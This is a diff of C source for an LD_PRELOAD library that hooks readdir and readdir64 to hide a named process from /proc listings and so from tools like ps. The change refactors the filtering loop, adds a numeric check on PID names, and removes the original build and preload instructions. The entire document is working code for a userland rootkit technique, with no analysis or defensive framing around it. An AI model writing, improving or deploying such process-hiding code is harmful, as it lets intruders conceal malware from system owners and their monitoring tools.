@@ -1,12 +1,10 @@
 #define _GNU_SOURCE
 
 #include <stdio.h>
-#include <stdlib.h>
 #include <dlfcn.h>
 #include <dirent.h>
 #include <string.h>
 #include <unistd.h>
-#include <errno.h>
 
 /*
  * Every process with this name will be excluded
@@ -37,10 +35,14 @@ static int get_dir_name(DIR* dirp, char* buf, size_t size)
 /*
  * Get a process name given its pid
  */
-static int get_process_name(long pid, char* buf, size_t size)
+static int get_process_name(char* pid, char* buf)
 {
+    if(strspn(pid, "0123456789") != strlen(pid)) {
+        return 0;
+    }
+
     char tmp[256];
-    snprintf(tmp, sizeof(tmp), "/proc/%ld/stat", pid);
+    snprintf(tmp, sizeof(tmp), "/proc/%s/stat", pid);
  
     FILE* f = fopen(tmp, "r");
     if(f == NULL) {
@@ -74,49 +76,23 @@ struct dirent* readdir(DIR *dirp)                                       \
                                                                         \
     struct dirent* dir;                                                 \
                                                                         \
-    /*                                                                  \
-     * Iterate the directory but if we find a /proc/PID                 \
-     * directory corresponding to a process to filter, then             \
-     * just avoid reporting it to the caller                            \
-     */                                                                 \
     while(1)                                                            \
     {                                                                   \
         dir = original_##readdir(dirp);                                 \
-        if(dir)                                                         \
-        {                                                               \
-            char buf[256];                                              \
-            if(get_dir_name(dirp, buf, sizeof(buf)) &&                  \
-                strcmp(buf, "/proc") == 0) {                            \
-                                                                        \
-                /*                                                      \
-                 * The caller is iterating through /proc,               \
-                 * filter every subdirectory with the right PID         \
-                 */                                                     \
-                long pid = strtol(dir->d_name, NULL, 10);               \
-                /* printf("file1 '%s' '%s'\n", buf, dir->d_name); */    \
-                if(errno != 0 &&                                        \
-                    get_process_name(pid, buf, sizeof(buf)) &&          \
-                    strcmp(buf, process_to_filter) == 0)                \
-                {                                                       \
-                    continue;                                           \
-                }                                                       \
-            }                                                           \
-            else                                                        \
-            {                                                           \
-                /* printf("file2 '%s' '%s'\n", buf, dir->d_name); */    \
+        if(dir) {                                                       \
+            char dir_name[256];                                         \
+            char process_name[256];                                     \
+            if(get_dir_name(dirp, dir_name, sizeof(dir_name)) &&        \
+                strcmp(dir_name, "/proc") == 0 &&                       \
+                get_process_name(dir->d_name, process_name) &&          \
+                strcmp(process_name, process_to_filter) == 0) {         \
+                continue;                                               \
             }                                                           \
         }                                                               \
-                                                                        \
         break;                                                          \
     }                                                                   \
-                                                                        \
     return dir;                                                         \
 }
 
 DECLARE_READDIR(dirent64, readdir64);
 DECLARE_READDIR(dirent, readdir);
-
-//
-// gcc -Wall -shared -fPIC -dl -o libprocesshider.so processhider.c
-// LD_PRELOAD=./libprocesshider.so ps
-//
